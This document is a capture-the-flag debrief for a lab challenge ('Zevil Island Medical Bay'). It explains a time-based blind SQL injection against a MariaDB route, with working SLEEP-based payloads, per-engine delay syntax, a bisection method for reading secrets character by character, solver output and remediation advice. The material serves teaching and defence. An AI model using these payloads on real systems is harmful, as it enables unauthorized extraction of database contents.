# Zevil Island Medical Bay — Debrief

**Node:** `p1_5` &middot; **Flag:** `SEIYAKU{time_tells_all}` &middot; **Route:** `GET /p1/medbay` &middot; **Sink:** `challenges/phase1.py`, `mariadb` (`patients` table, `records` table)

## Root cause

The status lookup builds its query the same way every other floor on this
exam does — raw f-string concatenation, no escaping:

```python
# challenges/phase1.py
q = f"SELECT status FROM patients WHERE id='{patient_id}'"  # VULN: string concat
cur.execute(q)
cur.fetchone()
```

That alone is the familiar sink. What makes this floor different from
every earlier one is that the route throws away everything the query
could have told it:

```python
except Exception:
    pass          # errors are silently swallowed, same as a clean miss
finally:
    conn.close()
checked = True    # the page renders identically either way
```

There is no result set to read (unlike p1_3's `UNION`), no raw exception
text (unlike p1_2's `extractvalue()`), and — the point that makes this
floor genuinely harder than p1_4 — not even a boolean token. p1_4's door
still answered one of two distinguishable words, PASS or FAIL; this
route renders the exact same `templates/p1_medbay.html` "status
checked." acknowledgment no matter what happened, with the reflected
`id` value being the only thing that ever changes between two requests
(and that's just the attacker's own input echoed back, not the DBMS
telling you anything). Read the response body and there is genuinely
nothing to learn.

## The technique: time-blind extraction

When even a single response bit (true/false, rendered differently) isn't
available, the last channel left is *how long the server took to
answer*. Most DBMS engines expose a function that pauses execution for N
seconds, and — crucially — that pause can be made conditional:

```sql
SELECT status FROM patients WHERE id='' OR IF(<condition>, SLEEP(N), 0)-- -
```

If `<condition>` is true, the query (and therefore the whole HTTP
request) takes measurably longer to complete than it otherwise would —
how much longer depends on how many rows the query ends up scanning
`IF(...)` against, not just on N alone (see the row-count-multiplier note
below). If the condition is false, the request returns at normal speed.
The page that comes back is identical in both cases — the only
observable difference is elapsed wall-clock time on the client's own
stopwatch.

**Per-DBMS conditional-delay functions** (the concept generalizes; only
the syntax changes):

| Engine | Conditional delay |
|---|---|
| MySQL / MariaDB | `IF(condition, SLEEP(N), 0)` |
| PostgreSQL | `SELECT CASE WHEN condition THEN pg_sleep(N) ELSE pg_sleep(0) END` |
| MS-SQL | `IF condition WAITFOR DELAY '0:0:N'` (or `; IF condition WAITFOR DELAY ...` stacked) |
| Oracle | `CASE WHEN condition THEN dbms_pipe.receive_message('x', N) ELSE NULL END` (no native conditional `SLEEP`; `dbms_pipe.receive_message` is the standard timing-delay substitute since Oracle has no boolean-context `IF`) |

This lab runs MariaDB, so every payload below uses `IF(condition,
SLEEP(N), 0)`.

**A real MariaDB nuance worth knowing when tuning a timing payload:** the
injected `WHERE id='...' OR IF(condition, SLEEP(N), 0)` clause is
*non-sargable* — no index can satisfy an `OR` against an arbitrary
computed expression, so MariaDB's optimizer falls back to a full table
scan of `patients` and evaluates `IF(condition, SLEEP(N), 0)` once for
**every row it scans**, not once per query. This lab's `patients` seed
holds 4 rows, so a true condition on this floor actually sleeps up to
**4 x N** seconds, not N — confirmed live below. This isn't a quirk of
this particular lab; it's a well-known MySQL/MariaDB blind-SQLi behavior,
and it's exactly why a real-world timing payload is often written to
sleep for a *short* duration per row (e.g. `SLEEP(0.3)`) rather than
assuming one sleep call per request — the observed delay scales with
however many rows the vulnerable query happens to scan.

The walk always has three phases:

1. **Confirm the injection point and that the response is genuinely
   silent** — force the condition true, force it false, confirm a
   malformed query behaves like a clean false, and confirm the *only*
   thing that differs across all three is timing, never page content.
2. **Bisect on `LENGTH()`** to learn the secret's length without ever
   reading a character.
3. **Bisect on `ASCII(SUBSTRING(...))`** per position to recover the
   secret one byte at a time, using `>=` comparisons (about 7 timed
   requests per byte over the printable ASCII range) instead of testing
   every candidate character serially.

## The walk (verified live against this exact seed)

**1. Confirm injection + silence.** The base query is
`SELECT status FROM patients WHERE id='{id}'`. Closing the string and
OR-ing in a conditional sleep doesn't depend on knowing any real patient
id:

```
/p1/medbay?id=' OR IF(1=1,SLEEP(1.2),0)-- -
```

took **4.836s** to answer — not the ~1.2s a single `SLEEP(1.2)` call
would suggest. That's the row-count multiplication described above: with
4 rows in `patients` and a non-sargable `OR`, MariaDB evaluates
`IF(1=1, SLEEP(1.2), 0)` once per scanned row, so the observed delay is
~4 x 1.2s. This is fully reproducible and scales predictably with the
configured sleep duration — varying N against this same seed:

| `SLEEP(N)` | observed elapsed | `4 x N` |
|---|---|---|
| 0.1 | 0.438s | 0.40s |
| 0.3 | 1.240s | 1.20s |
| 0.5 | 2.035s | 2.00s |
| 1.2 | 4.836s | 4.80s |

— confirming the 4x multiplier exactly matches this seed's 4-row
`patients` table, not some unrelated source of latency. The same
payload with the condition flipped false:

```
/p1/medbay?id=' OR IF(1=2,SLEEP(1.2),0)-- -
```

returned in **0.034s** — a normal, fast request, because a false
condition never fires `SLEEP()` at all, no matter how many rows get
scanned. Both responses rendered byte-for-byte the same
`templates/p1_medbay.html` page — the same "status checked." line, no
error, no different wording, nothing. A deliberately malformed payload —
an unbalanced quote with no trailing comment to neutralize the rest of
the literal —

```
/p1/medbay?id=' OR IF(1=1,SLEEP(1.2),0)
```

(the app's own trailing `'` after `{id}` is left dangling, an
unterminated string constant, so MariaDB never even reaches the `SLEEP`)
threw a syntax error server-side that the route's blanket `except:` folds
straight into an equally fast **0.024s**, identical-looking response to
the honest false case above. Zero extra signal from breaking the query,
exactly like p1_4 — except here there isn't even a PASS/FAIL word to
compare, only the clock.

**2. Bisect the secret's length.** `records.secret` is never selected by
any legitimate query this app makes — it only becomes reachable by
writing a subquery against it and folding the result into the `patients`
query's own `WHERE` clause via `OR`:

```
/p1/medbay?id=' OR IF(LENGTH((SELECT secret FROM records LIMIT 1))>=12,SLEEP(1.2),0)-- -
```

Bisecting on `>=` against `LENGTH(...)` (comparing elapsed time to a
0.6s threshold — comfortably above ordinary request latency of a few
tens of milliseconds, and comfortably below the ~4.8s a true condition
actually takes on this seed once the 4x row-count multiplier is
accounted for) finds the exact length without ever reading a character.
Against this seed that converges on **23**.

**3. Bisect each character.** For each position `1..23`:

```
/p1/medbay?id=' OR IF(ASCII(SUBSTRING((SELECT secret FROM records LIMIT 1),1,1))>=83,SLEEP(1.2),0)-- -
```

`ASCII(SUBSTRING(secret,N,1))>=mid` bisected over the printable range
(32–126) pins down the exact byte at position `N` in about 7 timed
requests, instead of testing every possible character one at a time. A
representative slice of real elapsed-time measurements from
`solvers/p1_5.py` recovering the first few characters against the live
stack:

```
[p1_5] target: http://localhost:8000/p1/medbay
[p1_5] per-row SLEEP=1.2s (observed ~4x due to the 4-row patients table's non-sargable OR — see module docstring), threshold=0.6s
[p1_5] step 0 — confirm injection point + silent (timing-only) oracle
  id="' OR IF(1=1,SLEEP(1.2),0)-- -" -> 4.836s (slow)
  id="' OR IF(1=2,SLEEP(1.2),0)-- -" -> 0.034s (fast)
  id="' OR IF(1=1,SLEEP(1.2),0)" (malformed) -> 0.022s (fast)
  ok: oracle is genuinely time-blind (true/false/error render identically)
[p1_5] step 1 — discover secret length via LENGTH() + timing bisection
  ok: LENGTH(records.secret) = 23
[p1_5] step 2 — walk the secret char-by-char via SUBSTRING()/ASCII() + timing bisection
  position  1: 'S'  (so far: 'S')
  position  2: 'E'  (so far: 'SE')
  position  3: 'I'  (so far: 'SEI')
  position  4: 'Y'  (so far: 'SEIY')
  position  5: 'A'  (so far: 'SEIYA')
  position  6: 'K'  (so far: 'SEIYAK')
  position  7: 'U'  (so far: 'SEIYAKU')
  position  8: '{'  (so far: 'SEIYAKU{')
  ...
  position 23: '}'  (so far: 'SEIYAKU{time_tells_all}')
[p1_5] recovered secret: SEIYAKU{time_tells_all}
  ok: recovered flag matches: SEIYAKU{time_tells_all}
[p1_5] PASS
```

(This is real, measured output from a live run of `solvers/p1_5.py`
against this exact seed — see the varying-`N` table above for the
independent confirmation that the ~4.8s "slow" figure is the 4-row
multiplier at work, not warmup or noise. Every "slow" answer in a walk
costs ~4x the configured per-row `SLEEP_SECONDS`; the 0.6s threshold
still sits with a wide margin on both sides — well above ordinary
sub-50ms request latency and well below the ~4.8s observed "slow" time —
so ordinary jitter on a loaded sandbox can't flip a verdict.)

No error text, no extra row, no PASS/FAIL word — every character above
came from nothing but a stopwatch.

## HxH analogy

Zevil Island's second exam phase is built around applicants who are told
almost nothing about how they're doing — no scoreboard, no visible pass
or fail, just the island itself continuing to run. Even Trick Tower's
Silent Room, a floor below, at least hands back one honest bit per
question. The medical bay hands back nothing legible at all: every visit
produces the identical, uninformative "status checked," whether the
patient existed, didn't, or the question was nonsense.

But "the desk says nothing" and "the desk reveals nothing" are still two
different properties. Time passes at the same rate whether or not
anyone chooses to comment on it, and a process that takes measurably
longer under one condition than another is still communicating something
— it's just doing it in a channel nobody bothered to silence, because it
never occurred to anyone that silence has to cover *every* channel, not
just the visible one.

## Remediation

- **Parameterized queries, always** — the same root fix as every floor on
  this exam:

  ```python
  cur.execute("SELECT status FROM patients WHERE id=%s", (patient_id,))
  ```

  With `patient_id` passed as a bound parameter, it can never break out
  of the string literal — `OR`, `IF`, `SLEEP`, `SUBSTRING`, all of it
  depend entirely on attacker text being re-parsed as SQL grammar, which
  parameterization removes as a possibility outright.
- **Rate-limit or normalize response times for anything that can't be
  fully parameterized away.** This is the lesson specific to time-blind
  injection: even a route with zero visible output can still leak
  arbitrary data if its *timing* is allowed to vary with a query's
  outcome. Where a variable-latency operation is unavoidable, padding
  every response to a fixed minimum duration (or moving slow work off
  the request/response path entirely) removes the channel outright.
- **Least privilege at the database layer.** Same principle as every
  earlier floor: even a successful injection should never be able to
  reach a table like `records` that the application's own legitimate
  queries never touch. A DB user scoped to only the tables a route
  actually needs turns "the query can technically ask this" into "the
  query is rejected before it ever runs."
- **No query-outcome-dependent behavior, full stop.** This is the same
  principle p1_4's debrief closes on, one layer further down: it's not
  enough for a response's *content* to stay constant — its *timing* has
  to stay constant too, or "identical response" was never actually true.
